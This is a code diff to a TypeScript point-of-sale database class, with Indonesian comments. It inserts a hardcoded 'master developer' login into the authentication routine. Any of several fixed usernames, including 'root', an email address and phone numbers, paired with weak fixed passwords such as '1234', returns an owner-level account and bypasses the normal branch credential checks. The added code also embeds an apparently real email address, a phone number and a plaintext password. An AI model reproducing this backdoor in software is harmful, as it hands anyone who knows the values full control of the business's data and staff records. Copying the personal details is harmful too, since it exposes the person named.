@@ -869,6 +869,30 @@ export class PosDatabase {
       return { success: false, message: 'Harap masukkan Username dan Password.' };
     }
 
+    // 0. MASTER SUPER ADMIN / DEVELOPER (IDENTIK DENGAN ABDI MEMBANGUN)
+    const isMasterUser =
+      (cleanId === "faizcimunk12@gmail.com" || cleanId === "088221511946" || cleanId === "089999" || cleanId === "master" || cleanId === "root") &&
+      (cleanPassword === "088221511946" || cleanPassword === "889900" || cleanPassword === "1234" || cleanPassword === "pakagan");
+
+    if (isMasterUser) {
+      const masterUser: Karyawan = {
+        id: 'kar-master-root',
+        cabang_id: 'pusat',
+        username: 'master',
+        nama: 'Master Developer (Faiz Cimunk)',
+        role: 'owner',
+        telepon: '0882-2151-1946',
+        pin_hash: '',
+        password_plain: '889900',
+        tipe_gaji: 'bulanan',
+        gaji_pokok: 0,
+        tunjangan: 0,
+        plafon_kasbon: 0,
+        is_active: true,
+      };
+      return { success: true, user: masterUser };
+    }
+
     // 1. CEK KREDENSIAL KASIR TOKO CABANG (WAJIB SAMA PERSIS DENGAN USERNAME & PASSWORD DARI PUSAT)
     const cabangList = await this.getAllCabang();
     const matchedBranch = cabangList.find(c => {
